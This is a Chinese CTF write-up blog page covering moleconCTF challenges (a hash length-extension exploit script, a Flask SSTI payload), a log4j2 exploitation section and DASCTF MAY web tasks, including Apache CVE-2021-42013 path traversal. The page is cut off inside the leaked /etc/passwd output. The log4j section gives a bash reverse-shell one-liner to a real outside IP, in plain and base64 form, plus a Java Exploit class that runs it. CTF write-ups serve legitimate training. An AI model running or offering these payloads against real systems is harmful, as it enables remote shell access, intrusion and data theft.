<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="为什么不拉弟弟一把呢">
<meta property="og:type" content="website">
<meta property="og:title" content="灵能对抗实验室">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="灵能对抗实验室">
<meta property="og:description" content="为什么不拉弟弟一把呢">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="hanbaiGG">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>灵能对抗实验室</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">灵能对抗实验室</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/01/9-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/01/9-1/" class="post-title-link" itemprop="url">9.1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-09-01 08:17:13" itemprop="dateCreated datePublished" datetime="2022-09-01T08:17:13+08:00">2022-09-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-09-05 23:55:23" itemprop="dateModified" datetime="2022-09-05T23:55:23+08:00">2022-09-05</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="moleconCTF"><a href="#moleconCTF" class="headerlink" title="moleconCTF"></a>moleconCTF</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Fancy-Notes"><a href="#Fancy-Notes" class="headerlink" title="Fancy Notes"></a>Fancy Notes</h3><p>服务端代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def get_user():</span><br><span class="line">    if not &#x27;user&#x27; in request.cookies:</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    cookie = base64.b64decode(request.cookies.get(</span><br><span class="line">        &#x27;user&#x27;)).decode(&#x27;raw_unicode_escape&#x27;)</span><br><span class="line">    assert len(cookie.split(&#x27;|&#x27;)) == 2</span><br><span class="line">    user_string = cookie.split(&#x27;|&#x27;)[0]</span><br><span class="line">    signature_string = cookie.split(&#x27;|&#x27;)[1]</span><br><span class="line"></span><br><span class="line">    if hashlib.sha256((SECRET_KEY + user_string).encode(&#x27;raw_unicode_escape&#x27;)).hexdigest() != signature_string:</span><br><span class="line">        print(&quot;nope&quot;)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line">    user = serialize_user(user_string)</span><br><span class="line">    return user</span><br></pre></td></tr></table></figure>
<p>COOKIE序列化与反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def serialize_user(user_string):</span><br><span class="line">    user = dict()</span><br><span class="line">    for kv in user_string.split(&#x27;,&#x27;):</span><br><span class="line">        k = kv.split(&#x27;=&#x27;)[0]</span><br><span class="line">        v = kv.split(&#x27;=&#x27;)[1]</span><br><span class="line">        user[k] = v</span><br><span class="line">    return user</span><br><span class="line"></span><br><span class="line">def deserialize_user(user):</span><br><span class="line">    values = []</span><br><span class="line">    for k in [&quot;username&quot;, &quot;locale&quot;]:</span><br><span class="line">        values.append(f&#x27;&#123;k&#125;=&#123;user.__dict__[k]&#125;&#x27;)</span><br><span class="line">    return &#x27;,&#x27;.join(values)</span><br></pre></td></tr></table></figure>
<p>COOKIE生成函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def generate_cookie(user):</span><br><span class="line">    user_string = deserialize_user(user)</span><br><span class="line">    signature_string = hashlib.sha256(</span><br><span class="line">        (SECRET_KEY + user_string).encode(&#x27;raw_unicode_escape&#x27;)).hexdigest()</span><br><span class="line">    cookie = base64.b64encode(</span><br><span class="line">        (f&#x27;&#123;user_string&#125;|&#123;signature_string&#125;&#x27;).encode(&#x27;raw_unicode_escape&#x27;)).decode()</span><br><span class="line">    return cookie</span><br></pre></td></tr></table></figure>
<p>可以看到user被分割反序列化后成为用户的数据，主要切入点是明示了使用加盐hash的防篡改手段。那对于有盐hash可以使用长度扩展攻击暴力破解，<br>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">import hashpumpy</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def make_request(user_string, signature):</span><br><span class="line">    notes_url = &quot;https://fancynotes.m0lecon.fans/notes&quot;</span><br><span class="line">    encode_me = f&quot;&#123;user_string&#125;|&#123;signature&#125;&quot;</span><br><span class="line"></span><br><span class="line">    user_string = f&quot;&#123;user_string.decode(&#x27;raw_unicode_escape&#x27;)&#125;|&#123;signature&#125;&quot;</span><br><span class="line">    cookie_value = base64.b64encode(user_string.encode(&#x27;raw_unicode_escape&#x27;)).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cookies = dict(user=cookie_value)</span><br><span class="line">    response = requests.get(notes_url, cookies=cookies, allow_redirects=False)</span><br><span class="line">    return response</span><br><span class="line"></span><br><span class="line">def is_valid_signature(user_string, signature):</span><br><span class="line">    resp = make_request(user_string, signature)</span><br><span class="line">    if resp.status_code == 200:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    hexdigest = &quot;REPLACE_WITH_RESULT_BASE64_DECODED_HASH_PART&quot; </span><br><span class="line">    pattern = &quot;ptm\&#123;(.*)\&#125;&quot;</span><br><span class="line"></span><br><span class="line">    for x in range(1, 100):</span><br><span class="line">        digest, msg = hashpumpy.hashpump(hexdigest, &quot;username=hackerman,locale=en&quot;, &quot;,username=admin&quot;, x)</span><br><span class="line">        if is_valid_signature(msg, digest):</span><br><span class="line">            print(f&quot;Correct length is: &#123;x&#125;&quot;)</span><br><span class="line">            response = make_request(msg, digest)</span><br><span class="line">            result = re.search(pattern, response.text)</span><br><span class="line">            flag = result.group(0)</span><br><span class="line">            print(f&quot;Flag is: &#123;flag&#125;&quot;)</span><br><span class="line">            break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>由于不知道到底是几位的salt，所以我们直接暴力跑一遍，得到flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptm&#123;pleaseD0NOTUseCr3am1nCarbon4r4!&#125;</span><br></pre></td></tr></table></figure>
<p><em>附</em><br>长度扩展攻击的主要原理是利用hash种子在一般情况下公开固定的特性，下一个字符块由上一个字符块的hash结果作为种子进行下一次hash，所以我们在已知原始数据hash结果的情况下可以在后方任意加上恶意注入。由于hash实在输入后加上salt的，所以通常情况下可以将所需字符前移{salt}位。<br>通过hashpumpy可以快速实现长度攻击。</p>
<h2 id="Dumb-Forum"><a href="#Dumb-Forum" class="headerlink" title="Dumb Forum"></a>Dumb Forum</h2><p>ssti漏洞，使用flask模板</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/profile&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">@login_required</span><br><span class="line">def profile():</span><br><span class="line">    with open(&#x27;app/templates/profile.html&#x27;) as p:</span><br><span class="line">        profile_html = p.read()</span><br><span class="line">    </span><br><span class="line">    profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me)</span><br><span class="line"></span><br><span class="line">    if(current_user.about_me == None):</span><br><span class="line">        current_user.about_me = &quot;&quot;</span><br><span class="line">    return render_template_string(profile_html)</span><br></pre></td></tr></table></figure>
<p>在邮箱中存在ssti漏洞，存在过滤，无法使用<code>()</code>在环境变量中得到flag</p>
<p>PAYLOAD</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.__init__.__globals__.os.environ&#125;&#125;@x.com</span><br></pre></td></tr></table></figure>
<h1 id="log4j2漏洞原理，复现及防御"><a href="#log4j2漏洞原理，复现及防御" class="headerlink" title="log4j2漏洞原理，复现及防御"></a>log4j2漏洞原理，复现及防御</h1><p>攻击路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.99.132.71/88 0&gt;&amp;1</span><br><span class="line">YmFzaCAtaSA%2BJiAvZGV2L3RjcC80Ny45OS4xMzIuNzEvODggMD4mMQ%3D%3D</span><br></pre></td></tr></table></figure>
<p>攻击载荷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class Exploit&#123;</span><br><span class="line">    public Exploit() throws Exception &#123;</span><br><span class="line">        //创建一个进程的实例</span><br><span class="line">        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/47.99.132.71/1234 0&gt;&amp;1&quot;&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();//输入流</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(is));//输入流缓冲区</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        while((line = reader.readLine()) != null) &#123;//循环读取缓冲区中的数据</span><br><span class="line">            System.out.println(line);//输出获取 的数据</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();//waitFor：返回该Process对象代表的进程的出口值，值0表示正常退出，非0非正常。</span><br><span class="line">        is.close(); </span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();//destroy：杀掉该Process对象代表的进程。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>##攻击原理<br>利用log4j lookup 的机制，提供了在任意位置想log4j配置添加值的方法。为了能够打印一些日志，警告，版本，开发者设计了<code>$&#123;xxx：YYY&#125;</code>来调用这一方法。为了方便起见，在匹配到该格式时将对<code>&#123;&#125;</code>中的内容进行解析，同时在lookup中我们可一通过前缀选择不同的事件类型<br><em>format匹配检测函数</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public void format(final LogEvent event, final StringBuilder toAppendTo) &#123;</span><br><span class="line">        Message msg = event.getMessage();</span><br><span class="line">        if (msg instanceof StringBuilderFormattable) &#123;</span><br><span class="line">            boolean doRender = this.textRenderer != null;</span><br><span class="line">            StringBuilder workingBuilder = doRender ? new StringBuilder(80) : toAppendTo;</span><br><span class="line">            int offset = workingBuilder.length();</span><br><span class="line">            if (msg instanceof MultiFormatStringBuilderFormattable) &#123;</span><br><span class="line">                ((MultiFormatStringBuilderFormattable)msg).formatTo(this.formats, workingBuilder);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ((StringBuilderFormattable)msg).formatTo(workingBuilder);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (this.config != null &amp;&amp; !this.noLookups) &#123;</span><br><span class="line">                for(int i = offset; i &lt; workingBuilder.length() - 1; ++i) &#123;</span><br><span class="line">                    if (workingBuilder.charAt(i) == &#x27;$&#x27; &amp;&amp; workingBuilder.charAt(i + 1) == &#x27;&#123;&#x27;) &#123;</span><br><span class="line">                        String value = workingBuilder.substring(offset, workingBuilder.length());</span><br><span class="line">                        workingBuilder.setLength(offset);</span><br><span class="line">                        workingBuilder.append(this.config.getStrSubstitutor().replace(event, value));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">						 ...</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">						...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>而在可供选择的event中由一个危险方法<code>JNDI</code>，我们就可用<code>jindilookup</code>处理我们构造的payload</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/25/catflagAK/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/25/catflagAK/" class="post-title-link" itemprop="url">catflagAK</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-25 10:55:11" itemprop="dateCreated datePublished" datetime="2022-05-25T10:55:11+08:00">2022-05-25</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/25/DASCTF-MAY/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/25/DASCTF-MAY/" class="post-title-link" itemprop="url">DASCTF_MAY</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-05-25 10:54:53 / 修改时间：18:35:37" itemprop="dateCreated datePublished" datetime="2022-05-25T10:54:53+08:00">2022-05-25</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="DASCTF-MAY"><a href="#DASCTF-MAY" class="headerlink" title="DASCTF MAY"></a>DASCTF MAY</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Power-cookie"><a href="#Power-cookie" class="headerlink" title="Power cookie"></a>Power cookie</h3><p>打开网页，点击按钮登录，抓包查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">GET /check HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: b648c999-934c-4f07-a945-b9ab2c7a4c01.node4.buuoj.cn:81</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Referer: http://b648c999-934c-4f07-a945-b9ab2c7a4c01.node4.buuoj.cn:81/</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cookie: UM_distinctid=17f2620a41f51-0014cd706842e08-30634644-184654-17f2620a4201f9; admin=1</span><br><span class="line"></span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在cookie值后面添加admin=1<br>得到flag</p>
<h3 id="魔法浏览器"><a href="#魔法浏览器" class="headerlink" title="魔法浏览器"></a>魔法浏览器</h3><p>提示浏览器，尝试修改user_agent<br>直接改为magic没效果，发现网页存在提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line"></span><br><span class="line">    let ua = &quot;\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35&quot;;    console[&quot;\x6c\x6f\x67&quot;](ua);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>解码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">s = <span class="string">&#x27;\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35&#x27;</span></span><br><span class="line">s = s.encode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">ss = s.decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&#x27;\\x&#x27;</span>, <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">un = parse.unquote(ss)</span><br><span class="line"><span class="built_in">print</span>(un)</span><br></pre></td></tr></table></figure>
<p>解码后得到正确ua</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75</span><br></pre></td></tr></table></figure>
<p>更改ua后得到flag</p>
<h3 id="getme"><a href="#getme" class="headerlink" title="getme"></a>getme</h3><p>查看网络指纹，发现站点使用apache2.4.50存在目录穿越（CVE-2021-42013）<br>同时给出了本页面目录所在地址，考虑利用目录穿越解题<br>验证漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">http://node4.buuoj.cn:28187/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span 